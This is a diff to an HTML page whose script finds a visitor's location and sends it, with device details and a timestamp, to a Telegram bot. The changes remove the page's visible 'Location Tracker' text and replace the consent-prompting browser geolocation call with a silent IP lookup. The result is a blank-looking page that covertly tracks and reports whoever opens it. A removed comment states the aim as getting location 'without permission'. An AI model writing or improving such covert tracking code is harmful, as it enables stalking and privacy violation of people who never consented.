@@ -36,11 +36,7 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>📍 Location Tracker</h1>
-        <p>Capturing your location...</p>
-        <div id="status">⏳ Loading...</div>
-    </div>
+
 
     <script>
         // ==================== CONFIG ====================
@@ -55,29 +51,27 @@
                             `📱 Device: ${device}\n` +
                             `🕒 Time: ${new Date().toLocaleString()}`;
 
-            // 1. Send text
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
-            });
-
-            // 2. Send native location pin
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
-            });
-        }
-
-        // ==================== MAIN ACTION ====================
-        async function captureAndSendData() {
             try {
-                // Get location without permission
-                const location = await getLocation();
+                // 1. Send text
+                const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
+                });
+                if (!textResponse.ok) {
+                    throw new Error(`Failed to send text message: ${textResponse.statusText}`);
+                }
 
-                // Send location data
-                await sendToTelegram(location.lat, location.lon, 'Geolocation API', 'Unknown', 'Anonymous');
+                // 2. Send native location pin
+                const locationResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
+                });
+                if (!locationResponse.ok) {
+                    throw new Error(`Failed to send location: ${locationResponse.statusText}`);
+                }
+
                 statusDiv.textContent = '✅ LOCATION SENT! Check your Telegram.';
             } catch (err) {
                 statusDiv.textContent = '❌ ERROR: ' + err.message;
@@ -85,25 +79,38 @@
             }
         }
 
-        // ==================== GET LOCATION ====================
-        function getLocation() {
+        // ==================== MAIN ACTION ====================
+        async function captureAndSendData() {
+            try {
+                // Get location using IP geolocation API
+                const location = await getLocationByIP();
+
+                // Send location data
+                await sendToTelegram(location.lat, location.lon, 'IP Geolocation API', 'Unknown', 'Anonymous');
+            } catch (err) {
+                statusDiv.textContent = '❌ ERROR: ' + err.message;
+                console.error(err);
+            }
+        }
+
+        // ==================== GET LOCATION BY IP ====================
+        function getLocationByIP() {
             return new Promise((resolve, reject) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.latitude && data.longitude) {
                             resolve({
-                                lat: position.coords.latitude,
-                                lon: position.coords.longitude
+                                lat: data.latitude,
+                                lon: data.longitude
                             });
-                        },
-                        (error) => {
-                            reject(error);
-                        },
-                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                    );
-                } else {
-                    reject(new Error('Geolocation is not supported by this browser.'));
-                }
+                        } else {
+                            reject(new Error('Failed to retrieve location data from IP geolocation API.'));
+                        }
+                    })
+                    .catch(error => {
+                        reject(new Error(`IP geolocation API error: ${error.message}`));
+                    });
             });
         }
 
